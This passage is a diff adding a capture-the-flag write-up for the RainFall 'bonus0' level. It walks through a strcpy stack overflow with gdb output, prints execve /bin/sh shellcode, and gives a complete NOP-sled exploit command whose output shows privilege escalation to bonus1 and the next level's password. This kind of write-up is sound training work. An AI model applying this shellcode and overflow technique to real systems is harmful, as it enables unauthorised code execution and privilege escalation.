@@ -100,3 +100,62 @@ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
  -
 PPPPPPPPPPPPPPPPPPPPP
 
+
+p reads 4096 bytes from STDIN and strcpy returns the first 20 bytes.
+then pp calls strcpy on the return of p strncpy and it's non null terminated.
+
+This means that there is the possibility of exploiting strcpy with a buffer 
+overflow.
+
+strcpy will copy s1 into s2 in memory and overwrite the EIP return address.
+This will lead to a segmentation fault.
+
+
+The shellcode we found is 23bytes long :
+
+shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+
+(gdb) disas p
+Dump of assembler code for function p:
+   ...
+   0x080484d0 <+28>:    lea    -0x1008(%ebp),%eax
+
+gdb) b *p + 28
+Breakpoint 1 at 0x80484d0
+(gdb) r
+Starting program: /home/user/bonus0/bonus0
+ -
+
+Breakpoint 1, 0x080484d0 in p ()
+(gdb) x $ebp-0x1008
+0xbfffe580:     0x00000000
+
+We know that the buffer start at the address 0xbfffe580
+We can skip to our shellcode by overwrite eip with NOP slide.
+We can go at 42 after our buffer at : 0xBFFFE5AA 
+We can't go under 58 NOP slide or we have a segmentation fault.
+
+First arg :
+(python -c "print('\x90' * 100 +
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')"
+
+Our NOP + shellcode
+
+
+Second arg :
+;python -c "print('B' * 14 + '\xaa\xe5\xff\xbf' + 'B')"; cat) | ~/bonus0
+
+With the B we reach EIP, then we overwrite it with our malicious buffer address
+and then on last byte to fill the buffer
+
+bonus0@RainFall:~$ (python -c "print('\x90' * 58 +
+'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80')";python -c "print('B' * 14 + '\xaa\xe5\xff\xbf' + 'C')"; cat) | ~/bonus0
+ -
+ -
+��������������������BBBBBBBBBBBBBB����C BBBBBBBBBBBBBB����C
+id
+uid=2010(bonus0) gid=2010(bonus0) euid=2011(bonus1) egid=100(users) groups=2011(bonus1),100(users),2010(bonus0)
+cat /home/user/bonus1/.pass
+cd1f77a585965341c37a1774a1d1686326e1fc53aaa5459c840409d4d06523c9
+
